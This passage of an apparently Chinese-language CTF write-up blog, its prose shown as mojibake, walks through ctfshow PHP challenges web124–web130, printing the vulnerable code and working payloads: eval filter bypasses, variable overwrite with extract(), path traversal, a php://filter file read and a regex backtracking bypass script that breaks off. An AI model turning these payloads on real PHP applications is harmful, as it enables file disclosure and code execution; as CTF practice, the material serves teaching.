æ—¶ï¼Œåé¢çš„ç‰¹æ®Šå­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ï¼Œä¸ä¼šè¢«æ›¿æ¢ã€‚</p><p><img src="/images/web_123.png"></p><p>è€Œåœ¨è¿™é¢˜ä¸­ï¼Œå‘ç°å®ƒç”¨evalæ‰§è¡Œäº†$cï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©åªæ»¡è¶³ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªifçš„æ¡ä»¶å³å¯ï¼ŒåŒæ—¶æ¯”è¾ƒè¿ç®—ç¬¦&lt;=åœ¨æ¯”è¾ƒä¹‹å‰ä¹Ÿä¼šè¿›è¡Œç±»å‹è½¬æ¢ï¼Œå³å¼±æ¯”è¾ƒ</p><p>åˆ™payloadä¸ºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">post<span class="token punctuation">:</span><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼šctfshow{0f7fb39f-e6f2-412b-bbc6-887a8c07db0c}</p><h4 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»§ä¸Šä¸€é¢˜ï¼Œè¿™é¢˜å°†echoç­‰ä¹Ÿè¿‡æ»¤ï¼Œä½†å‘ç°å¯ä»¥ä½¿ç”¨highlight_file()å‡½æ•°å¯¹flag.phpæ–‡ä»¶é«˜äº®ï¼Œï¼ˆä½¿ç”¨show_source()å‡½æ•°æ— ååº”ï¼Œåº”è¯¥è¢«banäº†ï¼‰ï¼›ç´¢å¼•payloadä¸º:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token number">2</span><span class="token operator">=</span>flag<span class="token operator">.</span>phppost<span class="token punctuation">:</span><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span>h<span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸæ‹¿åˆ°flag:ctfshow{a9fb32b2-0df6-4fe7-b2a2-04494d069390}<br>ä½†é€šè¿‡çœ‹ç¾¤ä¸»çš„è§†é¢‘ï¼ŒçŸ¥é“äº†å¦ä¸€ç§è§£æ³•ï¼Œå˜é‡è¦†ç›–ï¼Œé€šè¿‡postä¼ fl0g=flag_give_meï¼Œå°†funå‚æ•°èµ‹å€¼ä¸ºextract($_POST),æ„æ€æ˜¯ä½¿ç”¨extractå‡½æ•°å°†posté‡Œçš„å‚æ•°æ³¨å†Œä¸ºå˜é‡ï¼Œä»è€Œè¾¾åˆ°å˜é‡è¦†ç›–çš„ç›®çš„ï¼Œåˆ™payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fl0g<span class="token operator">=</span>flag_give_me<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹äº†å…¶ä»–å¸ˆå‚…ç»™çš„è§£æ³•ï¼Œæ‰çŸ¥é“äº†é¢˜ç›®ä¸­çš„$_SERVER[â€˜argvâ€™]çš„ç”¨å¤„ï¼Œåœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹ï¼Œè®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœï¼Œè¿™æ—¶å€™çš„<br>$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™]ï¼Œquery_stringæ˜¯Uniform Resource Locator (URL)çš„ä¸€éƒ¨åˆ†, å…¶ä¸­åŒ…å«ç€éœ€è¦ä¼ ç»™web applicationçš„æ•°æ®ï¼Œæœ¬åœ°æµ‹è¯•ï¼š</p><p><img src="/images/web_126.png"></p><p>æ‰€ä»¥å¯ä»¥æ„é€ payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span class="token punctuation">;</span>post<span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag:ctfshow{829f90f5-e08e-4538-942f-4f47c0d7434b}</p><h4 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å—¯å“¼ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜åˆšå¥½åˆç”¨åˆ°äº†$_SERVER[â€˜QUERY_STRINGâ€™]å˜é‡ï¼ŒåŒæ—¶ä¹ŸçŸ¥é“å†é€šè¿‡getæˆ–postä¼ å‚æ—¶å¦‚æœå‚æ•°ä¸­æœ‰ç©ºæ ¼ã€+ã€[ æ—¶ä¼šè‡ªåŠ¨è½¬åŒ–ä¸ºä¸‹åˆ’çº¿ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ï¼Œæ‰€ä»¥payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ctf show<span class="token operator">=</span>ilove36d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼šctfshow{c643887a-c67e-4b33-930d-a9e162498502}</p><h4 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å—¯å“¼ï¼Ÿ"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°å¯¹f1è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸èƒ½ä½¿ç”¨æ•°å­—å’Œå­—æ¯ï¼Œç„¶åéœ€è¦çŸ¥é“è¿™é‡Œå¯ä»¥ä½¿ç”¨gettextæ‰©å±•ï¼Œå¼€å¯æ­¤æ‰©å±•åï¼Œ_() å°±ç­‰æ•ˆäº gettext()ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">gettext</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¾“å‡ºç»“æœï¼š123</span><span class="token keyword">echo</span> <span class="token function">_</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¾“å‡ºç»“æœï¼š123</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>call_user_funcå‡½æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚<br>åˆ™payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>f1<span class="token operator">=</span><span class="token constant">_</span><span class="token operator">&amp;</span>f2<span class="token operator">=</span>get_defined_vars<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼šctfshow{6b91dc55-68e5-4d44-9d44-bf3dca83426d}</p><h4 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>striposï¼š(PHP 5, PHP 7)stripos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œè¿”å›è¯¥å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„æ•°å­—ä½ç½®ã€‚<br>readflie:è¾“å‡ºæ–‡ä»¶,è¯»å–æ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚Â è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚å¦‚æœå‡ºé”™è¿”å›    <code>FALSE</code> å¹¶ä¸”é™¤éæ˜¯ä»¥    @<strong>readfile()</strong> å½¢å¼è°ƒç”¨ï¼Œå¦åˆ™ä¼šæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚Â  </p><p>ç¬¬ä¸€ç§ç›´æ¥æ–‡ä»¶åŒ…å«ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>f<span class="token operator">=</span><span class="token operator">/</span>ctfshow<span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>flag<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¬¬äºŒç§ä¼ªåè®®è¯»å–ï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬é¢˜å†æ¬¡æ¶‰åŠåˆ°äº†ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼šPRCEæœ€å¤§å›æº¯æ¬¡æ•°ã€‚</p><ul><li>PHPä¸­ï¼Œä¸ºäº†é˜²æ­¢ä¸€æ¬¡æ­£åˆ™åŒ¹é…è°ƒç”¨çš„åŒ¹é…è¿‡ç¨‹è¿‡å¤§ä»è€Œé€ æˆè¿‡å¤šçš„èµ„æºæ¶ˆè€—ï¼Œé™å®šäº†ä¸€æ¬¡æ­£åˆ™åŒ¹é…ä¸­è°ƒç”¨åŒ¹é…å‡½æ•°çš„æ¬¡æ•°ã€‚ å›æº¯ä¸»è¦æœ‰ä¸¤ç§</li></ul><ol><li><strong>è´ªå©ªæ¨¡å¼</strong>ä¸‹ï¼Œå­—ç¬¦ä¸²éƒ¨åˆ†è¢«åŒ¹é…ï¼Œä½†æ˜¯ååŠéƒ¨åˆ†æ²¡åŒ¹é…ï¼ˆåŒ¹é…â€œç”¨åŠ›è¿‡çŒ›â€ï¼ŒæŠŠåé¢çš„éƒ¨åˆ†ä¹ŸåŒ¹é…è¿‡äº†ï¼‰æ—¶åŒ¹é…å¼å›é€€çš„æ“ä½œï¼Œåœ¨å‡ºç°*ã€+æ—¶å®¹æ˜“äº§ç”Ÿã€‚</li><li><strong>éè´ªå©ªæ¨¡å¼</strong>ä¸‹ï¼Œå­—ç¬¦ä¸²éƒ¨åˆ†è¢«åŒ¹é…ï¼Œä½†ååŠéƒ¨åˆ†æ²¡åŒ¹é…å®Œå…¨ï¼ˆåŒ¹é…â€œç”¨åŠ›ä¸å¤Ÿâ€ï¼Œéœ€è¦é€šé…ç¬¦å†åŒ¹é…ä¸€å®šçš„é•¿åº¦ï¼‰ï¼Œåœ¨å‡ºç°*?ã€+?æ—¶å®¹æ˜“äº§ç”Ÿã€‚</li></ol><ul><li>å½“ä¼ å…¥å­—ç¬¦ä¸²åœ¨æ­£åˆ™åŒ¹é…æ—¶å›æº¯æ¬¡æ•°è¶…è¿‡é™åˆ¶ï¼ˆé»˜è®¤1000000ï¼Œå¯è°ƒæ•´ï¼‰æ—¶ï¼Œä¼šæŠ¥é”™è¿”å›false<br>å†çœ‹åˆ°é¢˜ç›®æœ‰è¯´åˆ°çœç•¥25ä¸‡ä¸ªveryï¼Œæ‰€ä»¥è„šæœ¬ä¸ºï¼š</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://ebe6b9d4-02ef-42be-98fc-e5dfa2d1b23e.challenge.ctf.show/"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token 